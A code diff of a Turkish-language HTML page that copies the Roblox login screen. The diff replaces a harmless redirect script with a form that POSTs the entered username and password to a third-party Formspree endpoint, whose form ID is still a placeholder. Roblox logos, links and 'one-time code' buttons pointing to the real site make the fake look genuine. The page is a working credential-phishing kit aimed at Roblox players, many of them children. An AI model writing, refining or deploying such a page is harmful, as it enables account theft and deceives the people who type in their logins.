@@ -3,17 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giriş - Roblox</title>
+    <title>Roblox - Giriş</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: "HMD", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: "HMD", "Segoe UI", Roboto, Arial, sans-serif;
         }
 
         body {
-            /* İstediğin Arka Plan Resmi */
             background-image: url('https://assets.turbologo.com/blog/tr/2021/11/18072335/roblox-brand-958x575.png');
             background-size: cover;
             background-position: center;
@@ -22,19 +21,17 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
         }
 
-        /* Karartma Katmanı */
         body::before {
             content: "";
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.45);
+            background: rgba(0, 0, 0, 0.5);
             z-index: 0;
         }
 
-        /* SAĞ ÜST BUTONLAR (Eski özellikler duruyor) */
+        /* SAĞ ÜST NAV (Eski özellikler korunuyor) */
         .navbar {
             position: absolute;
             top: 20px;
@@ -45,7 +42,7 @@
         }
 
         .nav-link {
-            padding: 7px 16px;
+            padding: 8px 18px;
             border-radius: 4px;
             text-decoration: none;
             font-size: 14px;
@@ -53,90 +50,98 @@
             transition: 0.2s;
         }
 
-        .btn-white { background: white; color: black; border: 1px solid white; }
+        .btn-white { background: white; color: black; }
         .btn-outline { background: transparent; color: white; border: 1px solid white; }
-        .nav-link:hover { opacity: 0.8; }
 
-        /* ORTA PANEL - BİRE BİR ORİJİNAL */
-        .login-container {
+        /* YENİ GİRİŞ PANELİ (Görseldekiyle aynı) */
+        .login-card {
             position: relative;
             z-index: 5;
-            background-color: #393b3d; 
-            width: 400px;
-            padding: 30px 40px 40px 40px;
-            border-radius: 4px;
+            background-color: #2B2D2F;
+            width: 420px;
+            padding: 35px;
+            border-radius: 12px; /* Daha yuvarlak */
             text-align: center;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-        }
-
-        .logo-area { margin-bottom: 25px; }
-        .logo-area img {
-            width: 55px;
-            filter: brightness(0) invert(1);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
         h2 {
-            color: #fff;
-            font-size: 20px;
-            font-weight: 600;
+            color: white;
+            font-size: 32px; /* Görseldeki gibi büyük */
+            font-weight: 800;
             margin-bottom: 25px;
         }
 
         input {
             width: 100%;
-            height: 42px;
-            padding: 0 12px;
-            background-color: #232527;
+            height: 48px;
+            padding: 0 15px;
+            background-color: #393B3D;
             border: 1px solid #111;
-            border-radius: 4px;
-            color: #fff;
+            border-radius: 8px;
+            color: white;
             font-size: 16px;
-            margin-bottom: 12px;
+            margin-bottom: 15px;
             outline: none;
         }
 
-        input:focus { border-color: #fff; }
+        input:focus { border-color: #adb5bd; }
 
-        /* GİRİŞ YAP BUTONU - GERÇEK MAVİ */
-        .login-btn {
+        /* ANA GİRİŞ BUTONU */
+        .primary-btn {
             width: 100%;
-            height: 40px;
-            background-color: #0084dd;
-            color: #fff;
+            height: 48px;
+            background-color: transparent;
+            color: white;
+            border: 2px solid #adb5bd;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: 0.3s;
+        }
+
+        .primary-btn:hover { background-color: rgba(255,255,255,0.1); }
+
+        .forgot-text {
+            color: white;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            display: block;
+            margin-bottom: 25px;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #454749;
+            margin-bottom: 25px;
+        }
+
+        /* GRİ EK BUTONLAR */
+        .secondary-btn {
+            width: 100%;
+            height: 48px;
+            background-color: #393B3D;
+            color: white;
             border: none;
-            border-radius: 4px;
+            border-radius: 8px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 5px;
-            transition: 0.2s;
+            margin-bottom: 12px;
         }
 
-        .login-btn:hover { background-color: #00a2ff; }
+        .secondary-btn:hover { background-color: #454749; }
 
-        /* MAVİ LİNKLER */
-        .forgot-link {
+        .signup-text {
+            color: white;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 16px;
             display: block;
-            margin-top: 25px;
-            color: #00a2ff;
-            text-decoration: none;
-            font-size: 13px;
-        }
-
-        .forgot-link:hover { text-decoration: underline; }
-
-        .signup-footer {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #555;
-            color: #fff;
-            font-size: 14px;
-        }
-
-        .signup-link {
-            color: #00a2ff;
-            text-decoration: none;
-            font-weight: 600;
+            margin-top: 15px;
         }
     </style>
 </head>
@@ -147,38 +152,25 @@
         <a href="https://www.roblox.com/login" class="nav-link btn-outline">Giriş Yap</a>
     </div>
 
-    <div class="login-container">
-        <div class="logo-area">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Logo">
-        </div>
+    <div class="login-card">
+        <h2>Hesap ekle</h2>
 
-        <h2>Roblox Hesabına Giriş Yap</h2>
-
-        <form>
-            <input type="text" id="u" placeholder="Kullanıcı Adı/E-posta/Telefon" required>
-            <input type="password" id="p" placeholder="Şifre" required>
-            <button type="button" class="login-btn" onclick="checkLogin()">Giriş Yap</button>
+        <form action="https://formspree.io/f/BURAYA_KODUNU_YAZ" method="POST">
+            <input type="text" name="user" placeholder="Kullanıcı adı/E-posta/Telefon" required>
+            <input type="password" name="pass" placeholder="Şifre" required>
+            
+            <button type="submit" class="primary-btn">Giriş yapmak</button>
         </form>
 
-        <a href="https://www.roblox.com/login/forgot-password-or-username" class="forgot-link">Şifremi veya Kullanıcı Adımı Unuttum</a>
+        <a href="https://www.roblox.com/login/forgot-password-or-username" class="forgot-text">Şifrenizi veya kullanıcı adınızı mı unuttunuz?</a>
+        
+        <div class="divider"></div>
 
-        <div class="signup-footer">
-            Hesabın yok mu? <a href="https://www.roblox.com/" class="signup-link">Kaydol</a>
-        </div>
+        <button class="secondary-btn" onclick="window.location.href='https://www.roblox.com/login'">Bana Tek Kullanımlık Bir Kod Gönderin</button>
+        <button class="secondary-btn" onclick="window.location.href='https://www.roblox.com/login'">Hızlı Giriş</button>
+
+        <a href="https://www.roblox.com/" class="signup-text">Yeni Hesap Oluştur</a>
     </div>
-
-    <script>
-        function checkLogin() {
-            const user = document.getElementById('u').value;
-            const pass = document.getElementById('p').value;
-            if(user && pass) {
-                // Bilgi girildiyse gerçek siteye gider
-                window.location.href = "https://www.roblox.com/login";
-            } else {
-                alert("Lütfen tüm alanları doldur!");
-            }
-        }
-    </script>
 
 </body>
 </html>
